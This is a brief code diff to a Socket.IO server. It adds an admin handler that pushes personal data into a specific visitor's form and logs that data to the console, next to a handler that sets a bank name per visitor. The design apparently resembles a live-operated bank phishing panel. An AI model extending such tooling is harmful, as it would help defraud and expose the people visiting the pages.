@@ -934,6 +934,13 @@ io.on("connection", (socket) => {
     console.log(`Message sent to visitor ${currentSocketId}: ${message}`);
   });
 
+  // Admin: Push personal data to visitor form
+  socket.on("admin:pushPersonalData", ({ visitorSocketId, personalData }) => {
+    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("fillPersonalData", personalData);
+    console.log(`Personal data pushed to visitor ${currentSocketId}:`, personalData);
+  });
+
   // Admin: Set bank name
   socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
     const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
